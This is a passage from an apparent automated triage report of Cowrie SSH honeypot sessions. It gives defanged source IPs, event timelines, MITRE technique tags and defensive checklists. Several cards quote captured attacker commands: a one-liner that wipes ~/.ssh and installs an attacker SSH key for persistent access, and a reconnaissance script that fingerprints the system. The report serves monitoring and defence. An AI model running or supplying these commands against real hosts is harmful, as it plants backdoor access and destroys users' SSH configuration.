- [ ] Block `165.22.124[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b63117d25ccb

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-09-21 11:11 |
| **Last Seen** | 2026-09-21 11:11 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 11:11:31` | `cowrie.session.connect` |
| `2026-09-21 11:11:31` | `cowrie.client.version` |
| `2026-09-21 11:11:31` | `cowrie.client.kex` |
| `2026-09-21 11:11:32` | `cowrie.login.success` |
| `2026-09-21 11:11:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-21ef26549b0d

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-09-21 11:11 |
| **Last Seen** | 2026-09-21 11:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 11:11:33` | `cowrie.session.connect` |
| `2026-09-21 11:11:33` | `cowrie.client.version` |
| `2026-09-21 11:11:33` | `cowrie.client.kex` |
| `2026-09-21 11:11:33` | `cowrie.login.success` |
| `2026-09-21 11:11:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2f4c52f172bd

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-09-21 11:11 |
| **Last Seen** | 2026-09-21 11:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 11:11:34` | `cowrie.session.connect` |
| `2026-09-21 11:11:34` | `cowrie.client.version` |
| `2026-09-21 11:11:34` | `cowrie.client.kex` |
| `2026-09-21 11:11:35` | `cowrie.login.success` |
| `2026-09-21 11:11:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a8fec073764e

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-09-21 11:11 |
| **Last Seen** | 2026-09-21 11:11 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 11:11:35` | `cowrie.session.connect` |
| `2026-09-21 11:11:35` | `cowrie.client.version` |
| `2026-09-21 11:11:35` | `cowrie.client.kex` |
| `2026-09-21 11:11:35` | `cowrie.login.success` |
| `2026-09-21 11:11:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1f6b2a80314a

| Field | Detail |
|---|---|
| **Source IP** | `165.22.124[.]192` |
| **First Seen** | 2026-09-21 11:13 |
| **Last Seen** | 2026-09-21 11:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 11:13:27` | `cowrie.session.connect` |
| `2026-09-21 11:13:27` | `cowrie.client.version` |
| `2026-09-21 11:13:27` | `cowrie.client.kex` |
| `2026-09-21 11:13:27` | `cowrie.login.success` |
| `2026-09-21 11:13:28` | `cowrie.session.params` |
| `2026-09-21 11:13:28` | `cowrie.command.input` |
| `2026-09-21 11:13:28` | `cowrie.log.closed` |
| `2026-09-21 11:13:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.22.124[.]192` to AbuseIPDB if not already reported
- [ ] Block `165.22.124[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2c96babaaa91

| Field | Detail |
|---|---|
| **Source IP** | `165.22.124[.]192` |
| **First Seen** | 2026-09-21 11:16 |
| **Last Seen** | 2026-09-21 11:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 11:16:13` | `cowrie.session.connect` |
| `2026-09-21 11:16:13` | `cowrie.client.version` |
| `2026-09-21 11:16:13` | `cowrie.client.kex` |
| `2026-09-21 11:16:14` | `cowrie.login.success` |
| `2026-09-21 11:16:14` | `cowrie.session.params` |
| `2026-09-21 11:16:14` | `cowrie.command.input` |
| `2026-09-21 11:16:14` | `cowrie.log.closed` |
| `2026-09-21 11:16:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.22.124[.]192` to AbuseIPDB if not already reported
- [ ] Block `165.22.124[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2b0665c3902d

| Field | Detail |
|---|---|
| **Source IP** | `165.22.124[.]192` |
| **First Seen** | 2026-09-21 11:18 |
| **Last Seen** | 2026-09-21 11:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 11:18:53` | `cowrie.session.connect` |
| `2026-09-21 11:18:53` | `cowrie.client.version` |
| `2026-09-21 11:18:53` | `cowrie.client.kex` |
| `2026-09-21 11:18:53` | `cowrie.login.success` |
| `2026-09-21 11:18:54` | `cowrie.session.params` |
| `2026-09-21 11:18:54` | `cowrie.command.input` |
| `2026-09-21 11:18:54` | `cowrie.log.closed` |
| `2026-09-21 11:18:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.22.124[.]192` to AbuseIPDB if not already reported
- [ ] Block `165.22.124[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f22e36a83344

| Field | Detail |
|---|---|
| **Source IP** | `113.46.184[.]80` |
| **First Seen** | 2026-09-21 11:20 |
| **Last Seen** | 2026-09-21 11:20 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 11:20:15` | `cowrie.session.connect` |
| `2026-09-21 11:20:15` | `cowrie.client.version` |
| `2026-09-21 11:20:15` | `cowrie.client.kex` |
| `2026-09-21 11:20:16` | `cowrie.login.success` |
| `2026-09-21 11:20:16` | `cowrie.session.params` |
| `2026-09-21 11:20:16` | `cowrie.command.input` |
| `2026-09-21 11:20:17` | `cowrie.log.closed` |
| `2026-09-21 11:20:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `113.46.184[.]80` to AbuseIPDB if not already reported
- [ ] Block `113.46.184[.]80` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-87def7be370a

| Field | Detail |
|---|---|
| **Source IP** | `165.22.124[.]192` |
| **First Seen** | 2026-09-21 11:21 |
| **Last Seen** | 2026-09-21 11:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 11:21:30` | `cowrie.session.connect` |
| `2026-09-21 11:21:30` | `cowrie.client.version` |
| `2026-09-21 11:21:30` | `cowrie.client.kex` |
| `2026-09-21 11:21:30` | `cowrie.login.success` |
| `2026-09-21 11:21:31` | `cowrie.session.params` |
| `2026-09-21 11:21:31` | `cowrie.command.input` |
| `2026-09-21 11:21:31` | `cowrie.log.closed` |
| `2026-09-21 11:21:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.22.124[.]192` to AbuseIPDB if not already reported
- [ ] Block `165.22.124[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-426f66017f86

| Field | Detail |
|---|---|
| **Source IP** | `165.22.124[.]192` |
| **First Seen** | 2026-09-21 11:24 |
| **Last Seen** | 2026-09-21 11:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 11:24:11` | `cowrie.session.connect` |
| `2026-09-21 11:24:11` | `cowrie.client.version` |
| `2026-09-21 11:24:11` | `cowrie.client.kex` |
| `2026-09-21 11:24:12` | `cowrie.login.success` |
| `2026-09-21 11:24:12` | `cowrie.session.params` |
| `2026-09-21 11:24:12` | `cowrie.command.input` |
| `2026-09-21 11:24:12` | `cowrie.log.closed` |
| `2026-09-21 11:24:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.22.124[.]192` to AbuseIPDB if not already reported
- [ ] Block `165.22.124[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2bbe5fb56744

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-09-21 11:26 |
| **Last Seen** | 2026-09-21 11:26 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 11:26:16` | `cowrie.session.connect` |
| `2026-09-21 11:26:16` | `cowrie.client.version` |
| `2026-09-21 11:26:16` | `cowrie.client.kex` |
| `2026-09-21 11:26:16` | `cowrie.login.success` |
| `2026-09-21 11:26:17` | `cowrie.direct-tcpip.request` |
| `2026-09-21 11:26:17` | `cowrie.direct-tcpip.data` |
| `2026-09-21 11:26:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9eff775609b0

| Field | Detail |
|---|---|
| **Source IP** | `165.22.124[.]192` |
| **First Seen** | 2026-09-21 11:26 |
| **Last Seen** | 2026-09-21 11:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 11:26:51` | `cowrie.session.connect` |
| `2026-09-21 11:26:51` | `cowrie.client.version` |
| `2026-09-21 11:26:51` | `cowrie.client.kex` |
| `2026-09-21 11:26:51` | `cowrie.login.success` |
| `2026-09-21 11:26:52` | `cowrie.session.params` |
| `2026-09-21 11:26:52` | `cowrie.command.input` |
| `2026-09-21 11:26:52` | `cowrie.log.closed` |
| `2026-09-21 11:26:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.22.124[.]192` to AbuseIPDB if not already reported
- [ ] Block `165.22.124[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-978f340d906f

| Field | Detail |
|---|---|
| **Source IP** | `165.22.124[.]192` |
| **First Seen** | 2026-09-21 11:29 |
| **Last Seen** | 2026-09-21 11:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 11:29:38` | `cowrie.session.connect` |
| `2026-09-21 11:29:38` | `cowrie.client.version` |
| `2026-09-21 11:29:38` | `cowrie.client.kex` |
| `2026-09-21 11:29:38` | `cowrie.login.success` |
| `2026-09-21 11:29:39` | `cowrie.session.params` |
| `2026-09-21 11:29:39` | `cowrie.command.input` |
| `2026-09-21 11:29:39` | `cowrie.log.closed` |
| `2026-09-21 11:29:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.22.124[.]192` to AbuseIPDB if not already reported
- [ ] Block `165.22.124[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-222d5a93c5ee

| Field | Detail |
|---|---|
| **Source IP** | `103.189.235[.]167` |
| **First Seen** | 2026-09-21 11:31 |
| **Last Seen** | 2026-09-21 11:31 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 11:31:26` | `cowrie.session.connect` |
| `2026-09-21 11:31:26` | `cowrie.client.version` |
| `2026-09-21 11:31:26` | `cowrie.client.kex` |
| `2026-09-21 11:31:28` | `cowrie.login.success` |
| `2026-09-21 11:31:29` | `cowrie.session.params` |
| `2026-09-21 11:31:29` | `cowrie.command.input` |
| `2026-09-21 11:31:29` | `cowrie.command.failed` |
| `2026-09-21 11:31:30` | `cowrie.log.closed` |
| `2026-09-21 11:31:31` | `cowrie.session.params` |
| `2026-09-21 11:31:31` | `cowrie.command.input` |
| `2026-09-21 11:31:31` | `cowrie.session.file_download` |
| `2026-09-21 11:31:31` | `cowrie.log.closed` |
| `2026-09-21 11:31:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.189.235[.]167` to AbuseIPDB if not already reported
- [ ] Block `103.189.235[.]167` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0853a564f7a9

| Field | Detail |
|---|---|
| **Source IP** | `103.189.235[.]167` |
| **First Seen** | 2026-09-21 11:31 |
| **Last Seen** | 2026-09-21 11:31 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 11:31:32` | `cowrie.session.connect` |
| `2026-09-21 11:31:32` | `cowrie.client.version` |
| `2026-09-21 11:31:33` | `cowrie.client.kex` |
| `2026-09-21 11:31:34` | `cowrie.login.success` |
| `2026-09-21 11:31:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.189.235[.]167` to AbuseIPDB if not already reported
- [ ] Block `103.189.235[.]167` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3ffdbd8de6f5

| Field | Detail |
|---|---|
| **Source IP** | `43.155.134[.]4` |
| **First Seen** | 2026-09-21 11:31 |
| **Last Seen** | 2026-09-21 11:31 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 11:31:33` | `cowrie.session.connect` |
| `2026-09-21 11:31:33` | `cowrie.client.version` |
| `2026-09-21 11:31:33` | `cowrie.client.kex` |
| `2026-09-21 11:31:34` | `cowrie.login.success` |
| `2026-09-21 11:31:35` | `cowrie.session.params` |
| `2026-09-21 11:31:35` | `cowrie.command.input` |
| `2026-09-21 11:31:35` | `cowrie.command.failed` |
| `2026-09-21 11:31:35` | `cowrie.log.closed` |
| `2026-09-21 11:31:36` | `cowrie.session.params` |
| `2026-09-21 11:31:36` | `cowrie.command.input` |
| `2026-09-21 11:31:36` | `cowrie.session.file_download` |
| `2026-09-21 11:31:36` | `cowrie.log.closed` |
| `2026-09-21 11:31:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.155.134[.]4` to AbuseIPDB if not already reported
- [ ] Block `43.155.134[.]4` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d0f17bc40eb4

| Field | Detail |
|---|---|
| **Source IP** | `103.189.235[.]167` |
| **First Seen** | 2026-09-21 11:31 |
| **Last Seen** | 2026-09-21 11:31 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 11:31:35` | `cowrie.session.connect` |
| `2026-09-21 11:31:35` | `cowrie.client.version` |
| `2026-09-21 11:31:35` | `cowrie.client.kex` |
| `2026-09-21 11:31:38` | `cowrie.login.success` |
| `2026-09-21 11:31:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.189.235[.]167` to AbuseIPDB if not already reported
- [ ] Block `103.189.235[.]167` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-760c2a7a326a

| Field | Detail |
|---|---|
| **Source IP** | `43.155.134[.]4` |
| **First Seen** | 2026-09-21 11:31 |
| **Last Seen** | 2026-09-21 11:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 11:31:36` | `cowrie.session.connect` |
| `2026-09-21 11:31:36` | `cowrie.client.version` |
| `2026-09-21 11:31:37` | `cowrie.client.kex` |
| `2026-09-21 11:31:38` | `cowrie.login.success` |
| `2026-09-21 11:31:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.155.134[.]4` to AbuseIPDB if not already reported
- [ ] Block `43.155.134[.]4` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fffb35aff27a

| Field | Detail |
|---|---|
| **Source IP** | `43.155.134[.]4` |
| **First Seen** | 2026-09-21 11:31 |
| **Last Seen** | 2026-09-21 11:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 11:31:38` | `cowrie.session.connect` |
| `2026-09-21 11:31:38` | `cowrie.client.version` |
| `2026-09-21 11:31:38` | `cowrie.client.kex` |
| `2026-09-21 11:31:39` | `cowrie.login.success` |
| `2026-09-21 11:31:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.155.134[.]4` to AbuseIPDB if not already reported
- [ ] Block `43.155.134[.]4` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-89925844eb64

| Field | Detail |
|---|---|
| **Source IP** | `165.22.124[.]192` |
| **First Seen** | 2026-09-21 11:32 |
| **Last Seen** | 2026-09-21 11:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 11:32:20` | `cowrie.session.connect` |
| `2026-09-21 11:32:20` | `cowrie.client.version` |
| `2026-09-21 11:32:20` | `cowrie.client.kex` |
| `2026-09-21 11:32:20` | `cowrie.login.success` |
| `2026-09-21 11:32:21` | `cowrie.session.params` |
| `2026-09-21 11:32:21` | `cowrie.command.input` |
| `2026-09-21 11:32:21` | `cowrie.log.closed` |
| `2026-09-21 11:32:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.22.124[.]192` to AbuseIPDB if not already reported
- [ ] Block `165.22.124[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5047c105c3ff

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]49` |
| **First Seen** | 2026-09-21 11:34 |
| **Last Seen** | 2026-09-21 11:34 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 11:34:11` | `cowrie.session.connect` |
| `2026-09-21 11:34:12` | `cowrie.client.version` |
| `2026-09-21 11:34:12` | `cowrie.client.kex` |
| `2026-09-21 11:34:14` | `cowrie.login.success` |
| `2026-09-21 11:34:16` | `cowrie.session.params` |
| `2026-09-21 11:34:16` | `cowrie.command.input` |
| `2026-09-21 11:34:16` | `cowrie.command.input` |
| `2026-09-21 11:34:16` | `cowrie.command.input` |
| `2026-09-21 11:34:16` | `cowrie.command.input` |
| `2026-09-21 11:34:16` | `cowrie.command.input` |
| `2026-09-21 11:34:16` | `cowrie.command.success` |
| `2026-09-21 11:34:16` | `cowrie.command.input` |
| `2026-09-21 11:34:16` | `cowrie.command.input` |
| `2026-09-21 11:34:16` | `cowrie.command.input` |
| `2026-09-21 11:34:16` | `cowrie.command.input` |
| `2026-09-21 11:34:16` | `cowrie.log.closed` |
| `2026-09-21 11:34:18` | `cowrie.session.params` |
| `2026-09-21 11:34:18` | `cowrie.command.input` |
| `2026-09-21 11:34:18` | `cowrie.log.closed` |
| `2026-09-21 11:34:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]49` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0c047538ae4d

| Field | Detail |
|---|---|
| **Source IP** | `165.22.124[.]192` |
| **First Seen** | 2026-09-21 11:35 |
| **Last Seen** | 2026-09-21 11:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 11:35:03` | `cowrie.session.connect` |
| `2026-09-21 11:35:03` | `cowrie.client.version` |
| `2026-09-21 11:35:03` | `cowrie.client.kex` |
| `2026-09-21 11:35:03` | `cowrie.login.success` |
| `2026-09-21 11:35:04` | `cowrie.session.params` |
| `2026-09-21 11:35:04` | `cowrie.command.input` |
| `2026-09-21 11:35:04` | `cowrie.log.closed` |
| `2026-09-21 11:35:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.22.124[.]192` to AbuseIPDB if not already reported
- [ ] Block `165.22.124[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0ae7e8f513a8

| Field | Detail |
|---|---|
| **Source IP** | `74.118.81[.]174` |
| **First Seen** | 2026-09-21 11:35 |
| **Last Seen** | 2026-09-21 11:35 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 11:35:22` | `cowrie.session.connect` |
| `2026-09-21 11:35:22` | `cowrie.client.version` |
| `2026-09-21 11:35:22` | `cowrie.client.kex` |
| `2026-09-21 11:35:23` | `cowrie.login.success` |
| `2026-09-21 11:35:24` | `cowrie.session.params` |
